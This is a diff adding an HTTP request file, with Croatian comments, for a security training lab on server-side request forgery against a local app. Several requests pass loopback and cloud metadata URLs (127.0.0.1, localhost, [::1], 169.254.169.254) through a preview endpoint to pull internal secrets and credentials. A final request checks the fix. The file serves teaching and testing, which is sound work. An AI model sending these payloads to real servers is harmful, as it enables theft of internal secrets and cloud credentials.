@@ -1,0 +1,44 @@
+### =====================================================================
+### Lab03 – A01: Server-Side Request Forgery (CWE-918)
+### Upute: docs/labs/lab03-ssrf.md
+### =====================================================================
+@host = http://localhost:5080
+@token = ZALIJEPITE_TOKEN_OVDJE
+
+### 1) Prijava kao ana (kopirajte "token" u @token)
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{"username": "ana", "password": "Ana123!"}
+
+### 2) Legitimna upotreba: pregled javne stranice
+GET {{host}}/api/lab03/preview?url=https://example.com
+Authorization: Bearer {{token}}
+
+### 3) Interni endpoint izravno. S vlastitog računala ste i sami na loopbacku pa dobivate 200;
+###    s bilo kojeg drugog računala odgovor bi bio 403. Zamislite da je poslužitelj u oblaku.
+GET {{host}}/internal/admin/secrets
+
+### 4) NAPAD: poslužitelj sam sebi šalje zahtjev → vraća tajne (dbPassword, paymentApiKey)
+GET {{host}}/api/lab03/preview?url=http://127.0.0.1:5080/internal/admin/secrets
+Authorization: Bearer {{token}}
+
+### 5) NAPAD: isto preko imena localhost
+GET {{host}}/api/lab03/preview?url=http://localhost:5080/internal/admin/secrets
+Authorization: Bearer {{token}}
+
+### 6) NAPAD: IPv6 loopback
+GET {{host}}/api/lab03/preview?url=http://[::1]:5080/internal/admin/secrets
+Authorization: Bearer {{token}}
+
+### 7) NAPAD: cloud metadata servis (AWS/Azure/GCP) – u oblaku bi vratio vjerodajnice
+GET {{host}}/api/lab03/preview?url=http://169.254.169.254/latest/meta-data/
+Authorization: Bearer {{token}}
+
+### 8) Nepodržana shema – ranjivo: 502, nakon popravka: 400
+GET {{host}}/api/lab03/preview?url=ftp://example.com/datoteka.txt
+Authorization: Bearer {{token}}
+
+### 9) PROVJERA POPRAVKA: zahtjevi 4)–7) moraju vratiti 400 bez tajni, a 2) i dalje radi
+GET {{host}}/api/lab03/preview?url=http://127.0.0.1:5080/internal/admin/secrets
+Authorization: Bearer {{token}}
